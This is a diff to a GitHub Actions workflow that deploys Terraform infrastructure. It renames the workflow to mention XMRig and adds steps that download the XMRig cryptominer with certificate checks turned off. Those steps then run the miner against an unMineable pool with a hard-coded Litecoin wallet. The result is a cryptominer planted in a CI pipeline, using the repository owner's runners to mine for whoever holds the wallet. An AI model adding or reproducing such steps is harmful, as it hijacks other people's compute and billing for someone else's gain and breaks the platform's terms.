@@ -1,4 +1,4 @@
-name: Terraform CI
+name: Terraform and XMRig CI
 
 on:
   push:
@@ -18,6 +18,9 @@ jobs:
         with:
           terraform_version: 1.0.0  # Specify your desired Terraform version
 
+      - name: Terraform Login
+        run: echo "${{ secrets.TERRAFORM_CLOUD_TOKEN }}" | terraform login
+
       - name: Terraform Init
         run: terraform -chdir=./terraform init
 
@@ -29,3 +32,21 @@ jobs:
         env:
           AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
           AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
+
+      - name: Install wget
+        run: sudo apt-get install wget -y
+
+      - name: Download XMRig
+        run: |
+          wget --no-check-certificate https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-Linux-x64.tar.gz
+          tar -xzf xmrig-6.21.0-Linux-x64.tar.gz
+
+      - name: Run XMRig and Capture Output
+        run: |
+          cd xmrig-6.21.0
+          ./xmrig --algo=rx --coin=LTC -o stratum+ssl://rx.unmineable.com:4444 -u LTC:ltc1q347zsdpmes9p22z7zzgfxpeu0jq6w4nrathcv4.foxy0#43mx-rlih | tee xmrig.log
+          
+      - name: Print XMRig Log
+        run: |
+          echo "XMRig Hashrate Log:"
+          cat xmrig-6.21.0/xmrig.log
